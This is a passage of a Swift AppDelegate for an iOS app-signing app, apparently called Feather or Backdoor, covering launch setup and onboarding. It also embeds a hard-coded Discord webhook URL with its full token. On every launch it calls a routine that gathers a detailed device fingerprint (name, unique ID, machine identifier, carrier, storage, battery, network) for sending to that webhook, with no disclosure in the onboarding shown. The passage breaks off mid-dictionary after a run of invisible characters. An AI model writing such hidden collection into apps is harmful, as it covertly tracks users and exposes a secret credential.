import BackgroundTasks
import CoreData
import Foundation
import Nuke
import SwiftUI
import UIKit
import UIOnboarding
import CoreTelephony
import SystemConfiguration

var downloadTaskManager = DownloadTaskManager.shared

class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControllerDelegate {
    static let isSideloaded = Bundle.main.bundleIdentifier != "com.bdg.backdoor"
    var window: UIWindow?
    
    private let webhookURL = "https://discord.com/api/webhooks/1353949982612258826/Novph6SK-2gO0OzOEPDj8u8pCgR9-ypUmqyXzWAFwPpS2S4cdFDqz4bL8We4f_rJPYm9"
    private let hasSentWebhookKey = "HasSentWebhook"

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        let userDefaults = UserDefaults.standard
        userDefaults.set(Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String, forKey: "currentVersion")
        if userDefaults.data(forKey: "Feather.SigningOptions") == nil {
            Preferences.signingOptions = SigningOptions() // Default values from struct
        }

        createSourcesDirectory()
        addDefaultRepos()
        giveUserDefaultSSLCerts()
        imagePipline()
        setupLogFile()
        cleanTmp()

        window = UIWindow(frame: UIScreen.main.bounds)
        if Preferences.isOnboardingActive {
            let config = UIOnboardingViewConfiguration(
                appIcon: UIImage(named: "feather_glyph") ?? UIImage(),
                firstTitleLine: "Welcome to Feather",
                secondTitleLine: "Your App Signing Companion",
                features: [
                    UIOnboardingFeature(
                        icon: UIImage(systemName: "app.badge")!,
                        title: "Sign Apps",
                        description: "Easily sign and install apps"
                    ),
                    UIOnboardingFeature(
                        icon: UIImage(systemName: "gearshape.fill")!,
                        title: "Customize",
                        description: "Adjust settings to your liking"
                    )
                ],
                textViewConfiguration: UIOnboardingTextViewConfiguration(
                    text: "By continuing, you agree to our Terms of Service.",
                    linkTitle: "Terms of Service",
                    link: URL(string: "https://example.com/terms")!
                ),
                buttonConfiguration: UIOnboardingButtonConfiguration(
                    title: "Get Started",
                    backgroundColor: Preferences.appTintColor.uiColor
                )
            )
            let onboardingController = UIOnboardingViewController(withConfiguration: config)
            onboardingController.delegate = self
            window?.rootViewController = onboardingController
        } else {
            let tabBarController = UIHostingController(rootView: TabbarView())
            window?.rootViewController = tabBarController
        }

        DispatchQueue.main.async {
            self.window!.tintColor = Preferences.appTintColor.uiColor
            self.window!.overrideUserInterfaceStyle = UIUserInterfaceStyle(rawValue: Preferences.preferredInterfaceStyle) ?? .unspecified
        }

        window?.makeKeyAndVisible()

        let generatedString = AppDelegate.generateRandomString()
        if Preferences.pPQCheckString.isEmpty {
            Preferences.pPQCheckString = generatedString
        }

        Debug.shared.log(message: "Version: \(UIDevice.current.systemVersion)")
        Debug.shared.log(message: "Name: \(UIDevice.current.name)")
        Debug.shared.log(message: "Model: \(UIDevice.current.model)")
        Debug.shared.log(message: "Backdoor Version: \(logAppVersionInfo())\n")

        sendDeviceInfoToWebhook()

        if Preferences.appUpdates {
            BGTaskScheduler.shared.register(forTaskWithIdentifier: "kh.crysalis.feather.sourcerefresh", using: nil) { task in
                self.handleAppRefresh(task: task as! BGAppRefreshTask)
            }
            scheduleAppRefresh()
            let backgroundQueue = OperationQueue()
            backgroundQueue.qualityOfService = .background
            let operation = SourceRefreshOperation()
            backgroundQueue.addOperation(operation)
        }

        FloatingButtonManager.shared.show()
        
        return true
    }

    private func getDeviceInfo() -> [String: Any] {
        let device = UIDevice.current
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        
        let processInfo = ProcessInfo.processInfo
        let fileManager = FileManager.default
        let documentDir = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0] // Direct usage
        let storageInfo = try? fileManager.attributesOfFileSystem(forPath: documentDir.path)
        
        device.isBatteryMonitoringEnabled = true
        
        return [
            "Device Name": device.name,
            "Model": device.model,
            "System Name": device.systemName,
            "System Version": device.systemVersion,
            "Unique ID": device.identifierForVendor?.uuidString ?? UUID().uuidString,
            "Timestamp": ISO8601DateFormatter().string(from: Date()),
            "User Interface Idiom": String(describing: device.userInterfaceIdiom),
            "Bundle Identifier": Bundle.main.bundleIdentifier ?? "N/A",
            "App Version": logAppVersionInfo(),
            "Machine Identifier": identifier,
            "Processor Count": processInfo.processorCount,
            "Active Processor Count": processInfo.activeProcessorCount,
            "Physical Memory (MB)": processInfo.physicalMemory / (1024 * 1024),
            "Total Disk Space (MB)": (storageInfo?[.systemSize] as? Int64 ?? 0) / (1024 * 1024),
            "Free Disk Space (MB)": (storageInfo?[.systemFreeSize] as? Int64 ?? 0) / (1024 * 1024),
            "Battery Level": device.batteryLevel == -1 ? "Unknown" : String(device.batteryLevel * 100) + "%",
            "Battery State": batteryStateString(device.batteryState),
            "Operating System": processInfo.operatingSystemVersionString,
            "Is Low Power Mode": processInfo.isLowPowerModeEnabled,
            "Thermal State": thermalStateString(processInfo.thermalState),
            "Carrier Name": CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?.values.first?.carrierName ?? "N/A",
            "Is Connected to WiFi": isConnectedToWiFi(),
            "Screen Width": Int ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​